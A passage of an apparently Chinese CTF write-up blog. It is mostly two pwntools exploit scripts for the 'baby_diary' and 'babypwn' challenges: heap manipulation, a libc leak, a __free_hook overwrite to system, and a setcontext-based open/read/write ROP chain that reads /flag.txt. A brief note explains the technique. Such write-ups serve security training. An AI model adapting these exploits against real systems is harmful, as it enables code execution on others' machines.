class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="comment">#sh=process('./baby_diary')</span></span><br><span class="line"><span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">elf=ELF(<span class="string">'./baby_diary'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('./libc-2.31.so')</span></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content=<span class="string">'/bin/sh\x00'</span>)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4ba0</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x600</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#9</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#10 x</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#11 x</span></span><br><span class="line">    add(<span class="number">0x47</span>)<span class="comment">#12 x</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,p8(<span class="number">0</span>))<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#4,5,6,10, 11,13,14</span></span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)+p8(<span class="number">0x10</span>)) <span class="comment">#15  x</span></span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'5555555'</span>)<span class="comment">#16 x</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0x190</span>)+p64(<span class="number">0x101</span>)+p8(<span class="number">0x40</span>))<span class="comment">#</span></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)*<span class="number">6</span>+p8(<span class="number">0</span>)*<span class="number">6</span>)<span class="comment">#16</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p8(<span class="number">0</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#17+23</span></span><br><span class="line">        add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>)<span class="comment">#0</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'1'</span>*<span class="number">7</span>)<span class="comment">#17</span></span><br><span class="line"><span class="comment">#    free(14)</span></span><br><span class="line"><span class="comment">#    add(0x37,p64(1)+p8(0)*8)</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>)                     </span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">3</span>)    </span><br><span class="line">    show(<span class="number">17</span>)</span><br><span class="line">    addr=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-391</span></span><br><span class="line">    log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line">    malloc=addr<span class="number">-0x10</span></span><br><span class="line">    log.info(<span class="string">'malloc_hook:'</span>+hex(malloc))</span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc+<span class="number">10</span>,num=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">multi libc results:</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[!] you can choose it by hand</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'22222'</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p64(x.dump(<span class="string">'__free_hook'</span>)))<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x57</span>)<span class="comment">#17</span></span><br><span class="line">    add(<span class="number">0x57</span>,p64(x.dump(<span class="string">'system'</span>))) <span class="comment">#18</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sh=process(<span class="string">"./baby_diary"</span>)</span><br><span class="line">        <span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn2()</span><br><span class="line">            gdb.attach(sh)</span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./babypwn'</span>)</span><br><span class="line">p=process(<span class="string">'./babypwn'</span>)</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(v2)</span>:</span></span><br><span class="line">    s=Solver()</span><br><span class="line">    a1=BitVec(<span class="string">'a1'</span>,<span class="number">32</span>) </span><br><span class="line">    t = a1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            a1 ^= (<span class="number">32</span> * a1) ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>)) ^ (((<span class="number">32</span> * a1) ^ a1 ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>))) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    s.add(a1 == int(v2,<span class="number">16</span>))</span><br><span class="line">    s.check()</span><br><span class="line">    ans = int(s.model()[t].as_long())</span><br><span class="line">    print(hex(ans))</span><br><span class="line">    <span class="keyword">return</span> p32(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x88</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0xf0</span>*<span class="string">'1'</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x11</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x88</span>*<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">x=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">x=decode(x)</span><br><span class="line">y=x+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">main_arena=addr<span class="number">-328</span></span><br><span class="line">malloc=main_arena<span class="number">-0x10</span></span><br><span class="line">log,info(<span class="string">'malloc:'</span>+hex(malloc))</span><br><span class="line">x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc,num=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'yyyyyyy'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">rdi_ret=x.libcbase+<span class="number">0x0000000000025a3b</span></span><br><span class="line">rsi_ret=x.libcbase+<span class="number">0x00000000000263e9</span></span><br><span class="line">rdx_ret=x.libcbase+<span class="number">0x00000000001018c5</span></span><br><span class="line">rbp_ret=x.libcbase+<span class="number">0x000000000004a1a7</span></span><br><span class="line">rax=x.libcbase+<span class="number">0x000000000002606c</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">xx=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">xx=decode(xx)</span><br><span class="line">y=xx+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">edit(<span class="number">13</span>,p64(x.dump(<span class="string">'setcontext'</span>)+<span class="number">53</span>))</span><br><span class="line">pay=p64(rdi_ret)+p64(<span class="number">0</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0</span>)+p64(x.dump(<span class="string">'open'</span>))<span class="comment">#open(addr,0,0)</span></span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">3</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">1</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'write'</span>))</span><br><span class="line">print(len(pay))</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">15</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">0x10</span>+p64(addr+<span class="number">0x118</span>+<span class="number">0x360</span>)+p64(rdi_ret)+<span class="string">'1'</span>*<span class="number">0x18</span>+<span class="string">'3'</span>*<span class="number">0x40</span>+<span class="string">'22222'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00'</span>)</span><br><span class="line"><span class="comment">#free(10)</span></span><br><span class="line"><span class="comment">#edit(10,'xxxxxxx')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>heap题orw 第一次做，在正式比赛时踩了很多坑。赛后才复现出来</p><p>典型的all by one ，缩小free chunk 用法。但在正式比赛时，直接给自己玩坑chunk 在布局时给小了,导致后面orw 写不下，orz….好在通过z3来爆破出show函数的输出值,可以推算出chunk间的关系。不过，在复现时也学到一个知识：就算我们通过hook控制的只能是程序的rip。不能直接控制rbp和rsp。但我们可以通过SROP方法，利用setcontext来间接控制rbp和rsp。（这里有个坑，布置X64的sigcontext至少需0xf8的空间）同时c语言在执行一些函数时，传入参数格式正确但值不符合逻辑的如read(0,0,0)这种，利用chunk内原本的‘\x00’这样可以适当减少自己写入sigcontext 长度，只需要专注控制rbp和rsp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 